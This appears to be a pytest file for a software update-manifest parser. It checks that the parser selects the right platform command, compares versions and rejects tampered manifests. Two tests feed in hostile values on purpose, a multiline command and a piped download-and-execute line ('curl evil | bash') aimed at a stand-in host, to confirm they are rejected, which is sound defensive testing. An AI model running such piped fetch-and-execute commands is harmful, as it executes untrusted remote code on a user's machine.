import json
from pathlib import Path

import pytest

from meshpi.update import UpdateCheckError, parse_update_manifest, platform_key

ROOT = Path(__file__).resolve().parents[1]


def manifest():
    return json.loads((ROOT / "website" / "version.json").read_text(encoding="utf-8"))


def test_update_manifest_selects_platform_command():
    notice = parse_update_manifest(
        manifest(),
        current_version="0.5.2",
        platform_name="win32",
    )
    assert notice is not None
    assert notice.latest_version == "0.5.11"
    assert notice.command.endswith(".\\install-windows.ps1")


def test_update_manifest_returns_none_for_current_or_newer_version():
    assert (
        parse_update_manifest(
            manifest(),
            current_version="0.5.11",
            platform_name="linux",
        )
        is None
    )
    assert (
        parse_update_manifest(
            manifest(),
            current_version="0.5.12",
            platform_name="linux",
        )
        is None
    )


def test_update_manifest_rejects_multiline_command_and_bad_version():
    value = manifest()
    value["installers"]["linux"]["update_command"] = "curl example\nbash"
    with pytest.raises(UpdateCheckError):
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")
    with pytest.raises(UpdateCheckError):
        value = manifest()
        value["latest_version"] = "latest"
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")


def test_update_manifest_rejects_tampering():
    value = manifest()
    value["installers"]["linux"]["update_command"] = "curl evil | bash"
    with pytest.raises(UpdateCheckError):
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")


def test_platform_key():
    assert platform_key("linux") == "linux"
    assert platform_key("darwin") == "macos"
    assert platform_key("win32") == "windows"
